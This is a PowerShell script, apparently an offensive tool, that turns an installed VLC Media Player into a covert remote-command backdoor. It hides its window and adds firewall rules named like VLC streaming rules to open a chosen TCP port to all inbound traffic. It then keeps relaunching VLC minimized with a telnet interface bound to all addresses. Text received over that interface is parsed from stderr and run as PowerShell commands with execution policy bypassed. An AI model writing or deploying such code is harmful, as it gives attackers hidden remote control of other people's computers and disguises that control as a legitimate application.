<#
# Author:       TW-D
# Version:      1.0
#>

Param (
    [String] $TELNET_PORT,
    [String] $TELNET_PASSWORD
)

# Hide "PowerShell" window.
#
$Script:showWindowAsync = Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
"@ -Name "Win32ShowWindowAsync" -Namespace Win32Functions -PassThru
$showWindowAsync::ShowWindowAsync((Get-Process -Id $pid).MainWindowHandle, 0) | Out-Null

# Determines the path of the "VLC Media Player" executable.
#
$VIDEOLAN_64 = "$(Join-Path -Path "${ENV:ProgramFiles}" -ChildPath "VideoLAN\VLC\vlc.exe")"
$VIDEOLAN_32 = "$(Join-Path -Path "${ENV:ProgramFiles(x86)}" -ChildPath "VideoLAN\VLC\vlc.exe")"
$VIDEOLAN_UNKNOW = "$(Get-ItemPropertyValue -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\VLC media player\" -Name "InstallLocation" -ErrorAction SilentlyContinue)\vlc.exe"

$VIDEOLAN_PATH = ""
Switch ($True) {
    (Test-Path -Path "${VIDEOLAN_64}") {$VIDEOLAN_PATH = "${VIDEOLAN_64}"}
    (Test-Path -Path "${VIDEOLAN_32}") {$VIDEOLAN_PATH = "${VIDEOLAN_32}"}
    (Test-Path -Path "${VIDEOLAN_UNKNOW}") {$VIDEOLAN_PATH = "${VIDEOLAN_UNKNOW}"}
}

If ($TELNET_PORT -And $TELNET_PASSWORD -And $VIDEOLAN_PATH) {

    # Creates two rules on the native firewall of "Microsoft Windows" to :
    # - Allow the executable to open a TCP port.
    # - Allow all incoming connections on that TCP port.
    #
    (NETSH ADVFIREWALL FIREWALL ADD RULE NAME="VideoLAN VLC Media Player Stream Port" PROTOCOL=TCP LOCALPORT=$TELNET_PORT DIR=IN ACTION=ALLOW PROFILE=PUBLIC,PRIVATE,DOMAIN) | Out-Null
    (NETSH ADVFIREWALL FIREWALL ADD RULE NAME="VideoLAN VLC Media Player Stream Service" ENABLE=YES PROGRAM="${VIDEOLAN_PATH}" DIR=IN ACTION=ALLOW PROFILE=PUBLIC,PRIVATE,DOMAIN) | Out-Null
        
    Do {

        # Starts the "VLC Media Player" executable with the "Telnet" interface enabled.
        #
        $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
        $ProcessInfo.FileName = "${VIDEOLAN_PATH}"
        $ProcessInfo.Arguments = "--qt-notification 0 --qt-start-minimized --intf telnet --telnet-host 0.0.0.0 --telnet-port ${TELNET_PORT} --telnet-password ${TELNET_PASSWORD}"
        $ProcessInfo.CreateNoWindow = $True
        $ProcessInfo.UseShellExecute = $False
        $ProcessInfo.RedirectStandardOutput = $False
        $ProcessInfo.RedirectStandardError = $True

        $Process = New-Object System.Diagnostics.Process
        $Process.StartInfo = $ProcessInfo

        # Redirects the standard error output of this process and retrieves the payload for execution.
        #
        Register-ObjectEvent -InputObject $Process -EventName "ErrorDataReceived" -SourceIdentifier "Process.Stderr" -Action {
            $Data = $EventArgs.Data
            ("${Data}" -Match '\%22(?<Action>.+)%2F(?<Argument>.+)\%22')
            $Action = $Matches.Action
            $Argument = [URI]::UnescapeDataString($Matches.Argument)
            If ($Action -And $Argument) {
                Try {
                    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ${Argument}" -NoNewWindow
                } Catch {}
            }
            Clear-Variable -Name "Matches"
        } | Out-Null

        Register-ObjectEvent -InputObject $Process -EventName "Exited" -SourceIdentifier "Process.Exited" -Action {
            Write-Host "Process.Exited !"
        } | Out-Null

        Try {
            $Process.Start() | Out-Null
            $Process.BeginErrorReadLine()
            $Process.WaitForExit()
        } Finally {
            Unregister-Event -SourceIdentifier "Process.Stderr"
            Unregister-Event -SourceIdentifier "Process.Exited"
        }
        
    } While ($True)

}